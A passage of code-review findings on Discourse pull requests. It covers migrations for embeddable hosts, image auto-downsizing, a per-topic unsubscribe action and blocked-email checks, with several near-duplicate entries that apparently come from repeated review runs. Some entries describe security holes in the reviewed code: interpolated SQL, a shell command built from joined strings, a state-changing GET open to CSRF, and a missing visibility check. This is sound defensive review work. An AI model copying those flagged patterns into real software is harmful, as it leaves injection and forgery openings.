If the goal is to migrate to the new model, keep a deprecated shim that delegates to `EmbeddableHost.host_allowed?` for at least one release cycle.

title: Migration crashes when embed_category setting has no matching category
body: The migration executes `SELECT c.id FROM categories AS c INNER JOIN site_settings AS s ON s.value = c.name WHERE s.name = 'embed_category'` and indexes `[0]['id'].to_i` on the result. On any installation where either the `embed_category` site_setting row does not exist (e.g. fresh installs, upgrades from setups that never set it, or sites whose value was reset/cleared) or where the value does not match any category name, the result set is empty, `[0]` returns nil, and `nil['id'].to_i` raises NoMethodError and aborts the migration. The migration needs a nil guard (and the same applies if the SQL ever returns zero rows): e.g. `rows = execute(...); category_id = rows && rows.first ? rows.first['id'].to_i : SiteSetting.uncategorized_category_id`.

title: Raw SQL string interpolation of host value in migration
body: The migration inserts each host with `execute "INSERT ... VALUES ('#{h}', ...)"`. The value `h` comes straight from the prior `SiteSetting.embeddable_hosts` admin setting. If that value ever contains a single quote (or other SQL metacharacters) the migration's SQL is malformed or, in the worst case, executes unintended statements. Even though the value is admin-controlled and only used at migration time, this should be parameterized (or assigned through the EmbeddableHost model with `.create!`) so a stray quote can't break the upgrade and so the migration is robust to any prior state of the data.

title: update/destroy actions crash when EmbeddableHost is not found
body: `update` does `host = EmbeddableHost.where(id: params[:id]).first` then passes `host` directly to `save_host`, which immediately invokes `host.host = …`. If the id does not match a record, `host` is nil and this raises NoMethodError (and renders a 500). `destroy` has the same problem: it calls `host.destroy` on a nil record. The controller should detect the missing record and return `not_found` (or render an error JSON), matching the convention used by the rest of `Admin::*Controller`s.

title: before_validation callback crashes when host is nil
body: `before_validation` runs `self.host.sub!(/^https?:\/\//, '')` and `self.host.sub!(/\/.*$/, '')`. If a record is created without a `host` attribute (e.g. mass-assignment that omits host, or any path that calls `valid?`/`save` on an instance whose host is nil), `nil.sub!` raises NoMethodError and validation aborts before any user-friendly error is shown. The callback should no-op when host is blank, e.g. return unless host.present? (and ideally the controller already enforces this, but the model should defend itself).

title: Plural hydration retains undefined entries when IDs do not resolve
body: In `_hydrateEmbedded` the plural branch sets `obj[self.pluralize(subType)] = hydrated || [];`. When `_lookupSubType` returns undefined for an id (for example an `embeddable_host_ids` value that has no matching record in the side-loaded `embeddable_hosts` array, the lookup returns nothing), `.map` still produces an array containing undefined entries. The `hydrated || []` fallback never fires because the array is non-empty, so the resulting model attribute contains `undefined` values. Any subsequent UI iteration (`{{#each}}`, `.length`, `.get('id')`) will then either render blank rows or throw. The fallback should filter falsy entries, e.g. `(hydrated || []).compact`, before assignment.

title: SQL injection in migration via interpolated host value
body: The migration inserts into embeddable_hosts using string interpolation: VALUES ('#{h}', #{category_id}, ...). The value of h comes from the legacy embeddable_hosts site setting (one per line) and is used unescaped. A value containing a single quote (or other SQL meta-characters) would either break the migration or, if the site setting was modified outside of Rails, allow arbitrary SQL execution during migrate. Use parameterized SQL (e.g., ActiveRecord::Base.connection.exec_query with a bound host, or a model.create!) instead of string interpolation.

title: EmbeddingSerializer uses embed: :ids which prevents hydration of nested embeddable_hosts in the admin client
body: The serializer declares `has_many :embeddable_hosts, serializer: EmbeddableHostSerializer, embed: :ids`. With `embed: :ids` the JSON payload only contains `embeddable_host_ids: [...]` in the embedding object, but no separate top-level `embeddable_hosts` array. The store's `_hydrateEmbedded` requires the pluralized array to be present in the root to look up and hydrate objects from the IDs. As a result, the admin embedding page will always show an empty table even when embeddable hosts exist. Change to `embed: :objects` (or omit the embed option) so the full embeddable_hosts array is included in the response.

title: record_for_host comparison fails for hosts with any uppercase characters
body: `URI(host).host` preserves the case of the hostname. The query `where("lower(host) = ?", host).first` lowercases the DB column but leaves the parameter unchanged. If a URL's host is `EXAMPLE.com`, `lower("example.com")` (column) does not equal `"EXAMPLE.com"` (parameter) and no record is found, so the host is rejected even though a matching record exists (e.g., Browser sent Referer with uppercase letters, which is not normalized by the Rack referer middleware). Lowercase the parameter: `where("lower(host) = ?", host.downcase).first`.

title: update action crashes with NoMethodError when the requested host does not exist
body: `EmbeddableHost.where(id: params[:id]).first` can return nil if the id is missing, but `save_host(nil)` then executes `nil.host = ...`, raising NoMethodError and returning 500 to the admin. The destroy action has the same problem at line 15. Use `find_by(id: params[:id])` and short-circuit with a 404 / `not_found` when the record is missing instead of passing nil into save_host / calling destroy on nil.

title: Migration crashes when embed_category / uncategorized_category_id settings are missing
body: The query `SELECT c.id FROM categories c INNER JOIN site_settings s ... WHERE s.name = 'embed_category'` returns zero rows if either site setting has never been set, and `[0]['id']` on an empty result raises. The same pattern is used on line 15 for `uncategorized_category_id`. Either setting being missing aborts the migration entirely, leaving the deploy in a half-migrated state. Guard with a count check (e.g., `result.any? ? result[0]['id'].to_i : nil`) or look up via the SiteSetting/Category models instead of raw SQL.

title: Migration silently inserts category_id = 0 when uncategorized_category_id is missing
body: When the embed_category lookup yields nothing and the uncategorized fallback also returns nothing, `category_id` is left at 0 (or set to `-1` if `uncategorized_category_id` is still at its YAML default). Rows are then INSERTed with category_id = 0/-1, violating no DB constraint but creating data whose `belongs_to :category` association is permanently broken and which will never pass `belongs_to` validation on any future save (including admin edits). The migration should either abort in that case or skip the host with a warning.

title: category_id has no foreign key or index, allowing dangling references and inefficient lookups
body: The migration declares `t.integer :category_id, null: false` with no FK constraint and no index. Without an FK, deleting a category leaves `embeddable_hosts` with dangling `category_id` values that break the association. Also the lookup `where("lower(host) = ?", host)` performs a sequential scan; an index (ideally functional, `lower(host)`) would make `record_for_host` scale. Add `add_foreign_key :embeddable_hosts, :categories` (and a unique/functional index on host) before relying on this in production.

title: save_host dereferences params[:embeddable_host] without guarding against missing/nested keys
body: `host.host = params[:embeddable_host][:host]` and `host.category_id = params[:embeddable_host][:category_id]` will raise KeyError if the `:embeddable_host` key is absent (e.g., a client POSTs empty form-data) or NoMethodError if it is nil. The subsequent `self.host.sub!` in `before_validation` also crashes when `host` is nil. Use strong parameters and defensive parsing (e.g., `(params[:embeddable_host] || {}).fetch(:host, nil)`) so the controller renders a 400 instead of a 500.

title: Fabricator file contents are swapped between category_fabricator.rb and embeddable_host_fabricator.rb
body: The PR moves the existing `Fabricator(:category)` block into the new `spec/fabricators/embeddable_host_fabricator.rb` and adds `Fabricator(:embeddable_host)` to `spec/fabricators/category_fabricator.rb`. The two files end up with swapped contents. Fabrication still works (it autoloads every file in the directory), but the next person to read these files will be confused and will edit the wrong one. Restore the canonical layout: put the category fabricator in `category_fabricator.rb` and the embeddable_host one in `embeddable_host_fabricator.rb`.

title: Admin::EmbeddableHostsController spec only asserts class inheritance, not behavior
body: The single test is `expect(Admin::EmbeddableHostsController < Admin::AdminController).to eq(true)`. There is no coverage for the create / update / destroy actions, for normalization of the host (stripping http(s) and path), for the uncategorized fallback when category_id is blank, for rejecting hosts that fail the format regex, or for the nil-when-id-missing case. After fixing the bugs above, add specs that exercise these flows. `spec/controllers/admin/embedding_controller_spec.rb` has the same issue (single inheritance test).

title: store#update passes a callback that the REST adapter never invokes
body: `update(type, id, attrs)` calls `this.adapterFor(type).update(this, type, id, attrs, function(result) { ... storeMap ... return result; })`, but the RestAdapter's `update` signature only accepts four arguments and ignores any callback. The closure that re-keys the identity map when the server reassigns the id is therefore dead code: after a PUT that returns a new id, the store keeps the record under the old id in `_identityMap`. Either extend the adapter to invoke the callback, or drop the dead code to avoid future confusion.

title: Focus observer fires when editing toggles from true to false, leaking focus to the read-only host-name
body: `_focusOnInput` is decorated with both `@on('didInsertElement')` and `@observes('editing')`, so it runs whenever `editing` changes. After Cancel sets `editToggled` to false, the observer schedules `this.$('.host-name').focus()` for `afterRender`. Because the input is inside `{{#if editing}}`, that selector does not exist in the rendered DOM, so on some browsers the focus falls back to body and subsequent keypresses after Cancel can land outside the component. Guard the body with `if (this.get('editing'))` before scheduling the focus.

title: OptimizedImage.downsize is called with the same path for input and output
body: The auto-downsize loop calls OptimizedImage.downsize(tempfile.path, tempfile.path, "80%", ...). The underlying convert (or gifsicle, for animated GIFs) command then opens the file for reading and writing at the same path. ImageMagick and gifsicle will truncate the destination before reading from it, which can produce an empty or corrupt output file. The next call to Upload.create_for will then persist a zero-byte or garbled image with no error surfaced to the caller or user.

title: Two `def self.downsize` definitions silently shadow each other
body: Lines 145 and 149 both define `def self.downsize(...)`. Ruby does not support method overloading; the second definition (line 149) replaces the first (line 145). Any existing caller that previously invoked `OptimizedImage.downsize(from, to, max_width, max_height, opts)` will now dispatch to the new method, with the integer `max_width` being interpreted as a pre-formatted dimensions string and `max_height` being put inside the opts hash. This silently breaks every existing caller of the 4-argument form, and the now-redundant definition on line 145 should be removed (or renamed) before merging.

title: Animated-GIF downsize path passes an invalid dimensions value to gifsicle
body: When SiteSetting.allow_animated_thumbnails is true, OptimizedImage.optimize routes through downsize_instructions_animated, which builds `gifsicle ... --resize-fit #{dimensions} ...`. The controller passes the literal string `"80%"` as dimensions, but gifsicle's `--resize-fit` flag expects pixel dimensions of the form `WxH`, not a percentage. The animated-GIF auto-downsize path will fail or resize to nonsensical dimensions, defeating the feature for the very case the SiteSetting is meant to support.

title: Client-side upload size check is hardcoded to 10MB and ignores site settings
body: validateUploadedFile now uses `var maxSizeKB = 10 * 1024;` instead of `Discourse.SiteSettings['max_' + type + '_size_kb']`. Client-side validation no longer reflects the site's configured upload limit and loses the per-type `max_image_size_kb` / `max_attachment_size_kb` distinction. If a site admin configures a different limit, users will be blocked from uploading files the server would accept, or allowed to upload files the server rejects.

title: 413 entity-too-large error message hardcodes 10MB regardless of the real server limit
body: The case-413 branch now shows the user `max_size_kb: 10 * 1024` irrespective of the actual server-side cap. When the server's effective limit differs from 10MB (because max_image_size_kb or the new download cap has been reconfigured), the error dialog misreports the threshold the user must satisfy. The user-facing message is now decoupled from the server's real limit.

title: URL download size cap is hardcoded to 10MB instead of using the site setting
body: FileHelper.download is now called with `10.megabytes` instead of `SiteSetting.max_image_size_kb.kilobytes`. The download cap is no longer configurable via the same knob as the rest of the upload flow, and any site whose configured `max_image_size_kb` differs from 10MB will see inconsistent behaviour between direct uploads and URL-sourced fetches. Given the new auto-downsize feature is supposed to let images larger than `max_image_size_kb` through, the download cap should be raised above that setting (or made explicit), not silently frozen at 10MB.

title: Auto-downsize loop ignores OptimizedImage.downsize return value and proceeds even on total failure
body: The while loop re-checks `tempfile.size > SiteSetting.max_image_size_kb.kilobytes` but never inspects the boolean returned by OptimizedImage.downsize. OptimizedImage.convert_with rescues every error and returns false on failure (e.g., ImageMagick not installed, corrupt source), but the controller discards that signal and only decrements `attempt`. If all five iterations fail, the upload proceeds with a file that may still exceed the configured limit — or be empty/corrupt from the failed in-place rewrite — and the user receives no indication that auto-resize failed.

title: Auto-downsize gate uses filename extension instead of actual content type
body: The new block is gated on `FileHelper.is_image?(filename)`. For URL-sourced uploads the filename is derived from `File.basename(URI.parse(url).path)`, which frequently does not reflect the actual response (e.g., a JPEG served as `download.bin` or `attachment`). Real images with non-image filenames will skip auto-downsize and may exceed the configured limit, while non-image files masquerading as `.jpg` will be piped through OptimizedImage.downsize and likely corrupted by ImageMagick before being persisted.

title: Duplicate `def self.downsize` method shadows the original
body: The file ends up with two `def self.downsize` definitions: lines 145–147 keep the 4-arg form `downsize(from, to, max_width, max_height, opts={})`, and lines 149–151 add a new 3-arg form `downsize(from, to, dimensions, opts={})`. Ruby silently redefines the method, so the second definition wins and any caller using `OptimizedImage.downsize(path, path, width, height)` (the previous public arity) will now raise ArgumentError because the surviving method only accepts three positional arguments. The old definition should have been removed when the new one was added.

title: Client-side upload limit hardcoded to 10 MB, ignoring per-type site setting
body: The previous code used `Discourse.SiteSettings['max_' + type + '_size_kb']`, which honored `max_image_size_kb` for images and `max_attachment_size_kb` for attachments. The new code hardcodes `10 * 1024` for every type. This breaks attachment uploads (which have no downsizing fallback server-side) when `max_attachment_size_kb` is below 10 MB, and it can also let through files that the server rejects if `max_image_size_kb` is set below 10 MB. The change is unrelated to the image-downsizing feature and should use the per-type site setting like before.

title: 413 error message always reports 10 MB regardless of configured limit
body: The handler for HTTP 413 now reports `max_size_kb: 10 * 1024` even though the server-side limit comes from `SiteSetting.max_image_size_kb`. Users told they exceeded a 10 MB limit will be confused when the actual configured limit is something else (e.g. 1 MB), and the value rendered in the alert no longer reflects the server-side limit that triggered the rejection. The previous `Discourse.SiteSettings.max_image_size_kb` value should be preserved here.

title: URL download cap raised to a hardcoded 10 MB, ignoring site setting
body: `FileHelper.download(url, SiteSetting.max_image_size_kb.kilobytes, ...)` was replaced with `FileHelper.download(url, 10.megabytes, ...)`. The cap no longer honors `max_image_size_kb` and is now a fixed 10 MB regardless of what the administrator configured. For sites with a small `max_image_size_kb` this lets callers pull arbitrarily large files into a temp file (only to be downsized afterwards), increasing disk usage and memory pressure. The new 10 MB cap should at minimum remain consistent with `max_image_size_kb` and ideally be configurable.

title: Downsize loop discards `OptimizedImage.downsize` return value
body: `OptimizedImage.downsize` can return `false` when ImageMagick fails (e.g. corrupt or unsupported image, even though `FileHelper.is_image?` returned true). The controller ignores the return value, so the loop just decrements `attempt` and keeps going even though the file size never shrinks. There is no logging and no signal to the rest of the flow. The return value should be checked and the failure logged (and ideally surfaced to the user) instead of being silently dropped.

title: Oversized upload proceeds silently after 5 downsize attempts
body: If the file is still larger than `SiteSetting.max_image_size_kb.kilobytes` after the 5-iteration downsize loop completes, the controller falls through and calls `Upload.create_for` with the still-oversized `tempfile`. There is no error returned, no log entry, and no user-visible message, so a user who uploaded an image expecting it to be resized will get a rejected/oversized upload without explanation. The loop should break out with an explicit error (logged and returned in the response) when downsizing cannot get the file under the configured limit.

title: downsize method is redefined, silently dropping the 4-arg overload
body: The patch keeps the original `def self.downsize(from, to, max_width, max_height, opts={})` on line 145 and then defines a second `def self.downsize(from, to, dimensions, opts={})` on line 149. In Ruby, the later definition replaces the earlier one entirely; the first signature no longer accepts calls. Any existing caller that invokes `OptimizedImage.downsize(path, path, width, height)` (4 positional args) will now raise `ArgumentError: wrong number of arguments`. The resize/downsize helpers are used by jobs and other models, so this is a silent breaking change. Either keep a single canonical signature and migrate all callers, or branch inside one method based on argument types.

title: Client-side upload size check ignores site-configured limits
body: `validateUploadedFile` used to read `Discourse.SiteSettings['max_' + type + '_size_kb']`, honoring `max_image_size_kb` and `max_attachment_size_kb`. It now uses a hardcoded `10 * 1024` KB regardless of site settings or file type. This means admins who set a tighter limit (e.g. 3 MB) will accept up to 10 MB in the browser, only to be rejected by the server (or worse, accepted via the new auto-downsize path on the server). The client and server limits should stay aligned through the same setting.

title: 413 error message reports a hardcoded 10 MB instead of configured max_image_size_kb
body: `displayErrorForUpload` previously displayed `Discourse.SiteSettings.max_image_size_kb` in the user-facing alert, so the message matched the admin-configured limit. After the change it always says 10 MB. Users whose site has a lower (or higher) configured `max_image_size_kb` will see a misleading error string, which makes support and self-service diagnosis harder.

title: Downsize loop may not bring the image under max_image_size_kb
body: The retry loop scales the image to 80% of its current dimensions up to 5 times. Five iterations of 0.8x only reduces dimensions to ~0.328x of the original, which for typical JPEG/PNG content yields a file that is often larger than 32.7% of the original size. If the input is much bigger than `SiteSetting.max_image_size_kb` (e.g. 20 MB uploaded against a 1 MB limit) the loop exits with `attempt == 0` and `tempfile.size` still > the limit. `Upload.create_for` is then called with an oversized file, which either fails with a confusing error or, if server-side validation is lenient, succeeds with a file violating the configured policy. The loop should compare the actual byte size to the limit and either grow the reduction factor, use binary search on the quality/scale, or surface a clear error when the target cannot be reached.

title: Downsize failure is ignored, looping on the same oversized file
body: `OptimizedImage.downsize` returns `false` (and logs an error) when ImageMagick fails, but the controller loop does not check the return value. On failure the underlying file is unchanged, so `tempfile.size > SiteSetting.max_image_size_kb.kilobytes` stays true and the loop spins through all 5 attempts invoking `convert` again on the same broken file. The loop should break as soon as `downsize` reports failure, and ideally propagate a clear error to the user instead of silently accepting an over-limit upload.

title: URL download limit is hardcoded to 10 MB regardless of max_image_size_kb
body: `FileHelper.download(url, SiteSetting.max_image_size_kb.kilobytes, ...)` was changed to `FileHelper.download(url, 10.megabytes, ...)`. This decouples the maximum downloadable remote upload from the configured `max_image_size_kb` (which can be 1 MB, 5 MB, or unlimited). On installations with a tight policy, a remote URL can now fetch up to 10 MB and then attempt to downsize; on installations that set a higher limit, downloads above the configured limit are still capped at 10 MB. Either keep using the setting (and let the downsize loop handle oversize) or document the deliberate cap.

title: convert_with executes a shell string built from interpolated arguments
body: `convert_with` runs `` `#{instructions.join(" ")} &> /dev/null` ``, joining instruction-array entries with spaces and passing the result to the shell. With the refactor, `dimensions` is now passed as a free-form string (e.g. `"80%"`) from `OptimizedImage.downsize`'s third argument, and the controller already passes such a string. Any future caller that forwards user-controlled content into `dimensions` (or into `from`/`to` paths) can inject shell metacharacters and achieve command execution as the Rails process. The code should use the array form (e.g. `system(*instructions, out: '/dev/null', err: '/dev/null')`) so each argument is passed directly to `execve` without a shell.

title: Comment claims automatic reduction 'to allowed size' but loop only shrinks by 20%
body: The comment '# allow users to upload large images that will be automatically reduced to allowed size' implies the file will end up under `max_image_size_kb`. As noted above, 5 iterations of 80% scaling often cannot reach the configured byte limit, so users can still hit 'file too large' rejections. The comment also conflates pixel-dimension reduction with byte-size reduction, which can mislead future maintainers. Either tighten the algorithm so the promise holds, or rephrase the comment to reflect what the loop actually does.

title: GET request mutates user state, bypassing CSRF protection
body: The new `unsubscribe` action is wired to two GET routes (`get "t/:slug/:topic_id/unsubscribe"` and `get "t/:topic_id/unsubscribe"`) but it mutates state (changes `TopicUser#notification_level` and calls `save!`). Rails only checks CSRF tokens for non-GET requests, so any third-party page, image, link prefetch, or email preview that causes a logged-in user to issue a GET to these URLs will silently change that user's notification level. By contrast the existing `set_notifications` endpoint in this same controller correctly uses `post`. This new action must be POST/DELETE (or use a signed one-time token) and use Rails' `protect_from_forgery`/`verify_authenticity_token` flow.

title: `ensure_logged_in` makes the email unsubscribe link unusable
body: The whole point of this feature is the link the user receives in a notification email. The new `:unsubscribe` action is added to the `before_filter :ensure_logged_in` list and the route is a plain GET, so any recipient who clicks the unsubscribe link from their mail client without an active Discourse session is bounced to the login page instead of being unsubscribed. Standard email one-click unsubscribe (RFC 8058) requires an authenticated-by-token flow; here the URL must carry a per-user, per-topic signed secret that authorises the notification change without requiring a login.

title: `NoMethodError` 500 when the user has no `TopicUser` row
body: `tu = TopicUser.find_by(user_id: current_user.id, topic_id: params[:topic_id])` returns `nil` whenever the recipient of the email has never actually visited the topic (for example they were only `@mentioned` or quoted). The very next line does `tu.notification_level > ...`, which raises `NoMethodError: undefined method 'notification_level' for nil:NilClass` and the user gets a 500 page in place of the intended unsubscribe. The action must handle the no-row case (e.g. via `TopicUser.change`, which already creates the row when missing), or at minimum guard the comparison.

title: Toggle logic downgrades watching/tracking only to `regular`, so the user keeps getting emails
body: The branch `if tu.notification_level > TopicUser.notification_levels[:regular]` sets the level to `:regular` (which still sends notifications) for users who were `:watching` or `:tracking`. The only path that actually stops emails is the `else` branch (regular/muted -> muted). Users who were actively watching the topic and click 'unsubscribe' will continue receiving notification emails, which is the opposite of what the link promises. The action should mute (or apply the level chosen by the user via the page UI) rather than treat the operation as a `>= regular ? regular : muted` toggle.

title: Bypassing `TopicUser.change` skips the `MessageBus` publish and reason tracking
body: `TopicUser.change` is the existing canonical way to mutate a `TopicUser` row: it sets `notifications_changed_at`/`notifications_reason_id` when `notification_level` changes, publishes `MessageBus.publish("/topic/#{topic_id}", {notification_level_change: ...})` so other tabs/clients update in real time, and creates the row when missing. This controller fetches the row, mutates the attribute, and calls `save!`, so (a) no `MessageBus` event is fired (open clients keep showing the old level), (b) `notifications_changed_at` and `notifications_reason_id` are not refreshed, and (c) any race where the row is deleted between `find_by` and `save!` raises `ActiveRecord::RecordNotFound`. The action should delegate to `TopicUser.change(current_user.id, params[:topic_id], notification_level: ...)`.

title: Action renders the topic page instead of acknowledging the unsubscribe
body: After mutating the notification level, the action falls through to `perform_show_response`, which renders the normal topic view. The user (who came from an email expecting a confirmation) is dropped on the regular topic page with no visible feedback that anything happened, and the URL they bookmark/share contains `/unsubscribe`. There is no redirect to a confirmation screen and no flash/notice. Either render a dedicated confirmation view or redirect to a stable page that reflects the new state.

title: No tests cover the new per-topic unsubscribe URL in the email body
body: The new `unsubscribe_link` server locale adds a `%{unsubscribe_url}` markdown link (`To stop receiving notifications about this particular topic, [click here](%{unsubscribe_url})`), and `user_notifications.rb` now passes `unsubscribe_url: post.topic.unsubscribe_url`. The updated spec only asserts that the existing `user_preferences_url` is present; there is no expectation that the new `unsubscribe_url` is actually rendered into the body, nor any test for `Topic#unsubscribe_url`, `TopicsController#unsubscribe`, or the `notification_level` change behaviour. Add a test that the body contains the topic unsubscribe URL and that `Topic#unsubscribe_url` returns the expected path.

title: Typo `stopNotificiationsText` is misspelled
body: The new controller property is named `stopNotificiationsText` (extra `i` before `ations`). It is referenced with the same spelling from `templates/topic/unsubscribe.hbs` so it happens to work, but the name should be `stopNotificationsText`. Rename both occurrences to match the locale key (`topic.unsubscribe.stop_notifications`) and remove the future risk of someone 'fixing' only one side.

title: `bottom: initial` is unlikely to do what was intended
body: The new rule `.topic-unsubscribe .notification-options .dropdown-menu { bottom: initial; }` uses the CSS-wide keyword `initial`, resetting `bottom` to its initial value (i.e. `auto`). That just undoes any prior offset and is almost certainly not the intent — the goal was presumably to override the default dropdown placement for the embedded button on the unsubscribe page. Use an explicit value (`auto`, `100%`, or a measured offset) instead of `initial`, otherwise the rule is effectively a no-op.

title: Unsubscribe is a state-changing GET that also returns the full topic page
body: The new unsubscribe action is reached only via GET routes (config/routes.rb lines 440-441), yet it both mutates user state (`tu.save!` at line 113) and returns the rendered topic view (`perform_show_response` at line 115). GET requests must be idempotent. The unsubscribe URL is embedded in every notification email (app/mailers/user_notifications.rb line 295, config/locales/server.en.yml), and link-previewers, antivirus scanners, corporate proxies, and prefetching mail clients routinely fetch URLs found in emails. Each prefetch will silently toggle the user's notification level between regular and muted. There is no CSRF token (and none can be on a GET), so there is also no defence against any cross-site request that triggers navigation to the URL. The expected UX for an unsubscribe click is a short confirmation / re-subscribe page, not the entire topic with all posts; as shipped, the response is the wrong page and the action is unsafe to expose as a GET.

title: Unsubscribe action has no authorization check on the topic
body: After `@topic_view = TopicView.new(...)` the action immediately looks up the user's TopicUser row (line 105), mutates it (line 108-111) and saves it (line 113) without ever calling `guardian.ensure_can_see!(@topic_view.topic)` (compare with `mute`, `re_pin`, `clear_pin`, etc. in the same controller which all do call `ensure_can_see!`). Any logged-in user who knows or guesses a topic id can visit `/t/<slug>/<id>/unsubscribe` and silently unsubscribe from any topic, including topics in read-restricted categories or topics they have been removed from. Because the action then calls `perform_show_response`, the rendered response can also expose topic content the user is not authorised to see when `TopicView.new` does not raise (e.g. a topic in a category the user still has limited access to).

title: NoMethodError when the user has no TopicUser row for the topic
body: `tu = TopicUser.find_by(user_id: current_user.id, topic_id: params[:topic_id])` (line 105) returns nil for any user who has never opened the topic but is still on the recipient list of the notification email (the common case for someone clicking 'unsubscribe' from an email). The very next line, `if tu.notification_level > ...` (line 107), then calls `notification_level` on nil and raises `NoMethodError`, producing a 500 for what is the primary intended use of the link. The action should either use `TopicUser.get`/`TopicUser.change` (which upserts) or guard explicitly against a nil `tu` (and decide what muting means for a user who never had a row).

title: Server renders topics/show instead of the unsubscribe confirmation page
body: After saving the new notification level, `perform_show_response` (line 115) renders `topics/show`, i.e. the full topic view including all posts, breadcrumbs, reply controls, etc. The PR also adds a complete client-side unsubscribe experience (`controllers/topic-unsubscribe.js.es6`, `routes/topic-unsubscribe.js.es6`, `templates/topic/unsubscribe.hbs`, `views/topic-unsubscribe.js.es6`, the new `.topic-unsubscribe` SCSS block, and the `topic.unsubscribe.stop_notifications` / `change_notification_state` i18n strings), but the server pre-empts all of it by rendering the show template. The new Ember route, controller, view, template, styles, and locale strings are unreachable through the URL the email links to. The action should either render an unsubscribe-specific server template (`render :unsubscribe`) or redirect (e.g. 302 to `topic.relative_url`) so the user lands on a confirmation / change-notification-state page rather than the topic itself.

title: No assertion that the per-topic unsubscribe URL reaches the email body
body: The new spec only adds `unsubscribe_url: "/t/1234/unsubscribe"` to the `MessageBuilder` constructor (line 172) and the server locale now interpolates `%{unsubscribe_url}` into `unsubscribe_link` (config/locales/server.en.yml), but neither of the two existing assertions in this context checks that the per-topic URL ends up in the rendered email. The current tests only assert the `user_preferences_url` is in the body and that the `List-Unsubscribe` header is present — both of which were true before this PR. A test such as `expect(message_with_unsubscribe.body).to include('/t/1234/unsubscribe')` (and an equivalent against `html_part`) is required to lock in the new behaviour; without it a regression in `message_builder.rb` or the locale string will go undetected. There are also no controller specs covering the new `TopicsController#unsubscribe` action (authorization, slug redirect, nil `tu`, notification-level toggle).

title: Typo in computed property: stopNotificiationsText
body: The computed property is named `stopNotificiationsText` (N-o-t-i-f-i-c-a-t-i-o-n-s, three i's) and the same misspelling is used in `templates/topic/unsubscribe.hbs` line 3. The double mistake cancels out so the template currently renders, but the property name is wrong and grep / future edits will trip over it. It should be `stopNotificationsText`. (Note this only matters once the server-side bug above is fixed and the unsubscribe template is actually reached.)

title: CSRF: GET request mutates notification state
body: The `unsubscribe` action is wired to two GET routes (`get "t/:slug/:topic_id/unsubscribe"` and `get "t/:topic_id/unsubscribe"` in config/routes.rb) and immediately mutates the user's `TopicUser.notification_level` based on `current_user.id`. Rails does not require a CSRF token for GET requests, so any logged-in user can be silently toggled off a topic by an attacker who embeds the unsubscribe URL in an image/link on a third-party site. The unsubscribe URL is also publicly linkable (no signed token), and the `before_filter :ensure_logged_in` does not help because the victim is already authenticated. This should be a POST (or require a signed token like `EmailUnsubscribeKey`), and ideally the state change should happen only after a user gesture.

title: NoMethodError when no TopicUser row exists
body: `tu = TopicUser.find_by(...)` may return nil if the current user has no TopicUser record for that topic (e.g. they have never visited it). The very next line dereferences `tu.notification_level`, which will raise `NoMethodError: undefined method 'notification_level' for nil`. The action needs to handle the nil case, e.g. create the row or short-circuit, otherwise every unsubscribe from a never-visited topic raises a 500.

title: No authorization / visibility check on topic
body: Unlike the regular `show` action, `unsubscribe` never calls `guardian.ensure_can_see!(@topic_view.topic)` (or any equivalent). `TopicView.new` is invoked with `current_user` but the action then loads/writes a `TopicUser` row for `params[:topic_id]` without verifying the topic exists, is not deleted, and is in a category the user is allowed to see. A user could be subscribed/muted on topics they should never have known about, and the response can leak topic state for topics in restricted categories.

title: Template path does not match route registration
body: The route map registers a top-level route `this.route('topicUnsubscribe', { path: '/t/:slug/:id/unsubscribe' });` and a top-level view `views/topic-unsubscribe.js.es6`, but the template is placed at `templates/topic/unsubscribe.hbs`. Ember resolves templates by dasherizing the route name, so `topicUnsubscribe` looks up `templates/topic-unsubscribe.hbs`, not `templates/topic/unsubscribe.hbs` (which would belong to a nested `topic/unsubscribe` route that is not defined). The unsubscribe page will fail to render its body. Either nest the route under `topic` and move the template accordingly, or rename the template/view/controller files so the route, controller, view, and template all use the same `topicUnsubscribe` name.

title: Unsubscribe toggles instead of muting from email
body: The toggle logic (`if tu.notification_level > :regular then :regular else :muted`) is appropriate for the on-site notification dropdown, but the link in the email is built via `post.topic.unsubscribe_url` and shown as "To stop receiving notifications about this particular topic, click here". A user who is `:tracking` or `:watching` will be downgraded only to `:regular`, not muted, so the unsubscribe email doesn't actually stop notifications on the first click. Either the email link should target an endpoint that always mutes, or the toggle behavior should be reconsidered.

title: Bypasses TopicUser.change side effects
body: The action writes the new notification level with `tu.save!`, instead of using `TopicUser.change(current_user.id, params[:topic_id], notification_level: ...)`. As a result `notifications_changed_at`, `notifications_reason_id`, and the `MessageBus.publish("/topic/#{topic_id}", {notification_level_change: ...})` message that the rest of the app relies on are skipped. The client will not refresh its notification-level badge, and auditing/debugging of why a notification level changed is lost.

title: Typo in controller property name and template binding
body: The property is defined as `stopNotificiationsText` (note the doubled 'i') and is consumed by the template as `{{{stopNotificiationsText}}}`. While the template still resolves because both sides share the typo, this will trip future readers and any future rename attempt. The i18n key (`topic.unsubscribe.stop_notifications`) is correctly spelled, so the property should be `stopNotificationsText`.

title: No tests cover the new unsubscribe feature
body: The PR adds a new controller action, new routes, a new Ember route/controller/view/template, a new `Topic#unsubscribe_url` method, and includes the topic unsubscribe URL in notification emails. The only test change is adding `unsubscribe_url: "/t/1234/unsubscribe"` to an existing example and asserting `List-Unsubscribe` is present. There are no controller specs for `TopicsController#unsubscribe` (CSRF/POST vs GET, slug redirect, nil TopicUser, permission check), no assertions that the email body actually contains the topic-specific unsubscribe link, and no assertion that `header_args['List-Unsubscribe']` carries the per-topic URL (RFC 8058). Without these the CSRF and behavior regressions above will not be caught.

title: List-Unsubscribe header ignores topic-specific URL
body: `header_args` only ever sets `List-Unsubscribe` to `<#{template_args[:user_preferences_url]}>`, even though `@opts[:unsubscribe_url]` is now passed in from `user_notifications.rb`. Email clients use the `List-Unsubscribe` header for one-click unsubscribe (RFC 8058); the topic-specific URL the PR just introduced is never used in the header, so the whole point of exposing `unsubscribe_url` to the builder is wasted for header-based unsubscribe.

title: Blocked-email lookup is case-sensitive; case variants bypass the block
body: `BlockedEmail.where(email: email).first` performs a case-sensitive equality match, and the migration adds a case-sensitive unique index on the same column. User#email is not downcased on assignment, so a user registering as `Bad@Spam.com` will not match a blocked record stored as `bad@spam.com`, and admins can even create duplicate block rows with different casings. The whole purpose of the feature (stop spammers with known addresses) is defeated by trivial case mutation. Normalize on both sides: store the blocked email in a canonical (lower) form via a `before_validation` callback and add a unique index that ignores case (e.g., a functional index on `lower(email)` or a citext column), and compare with `where('lower(email) = ?', email.to_s.downcase)`.

title: Non-atomic read-then-update of match_count loses concurrent increments
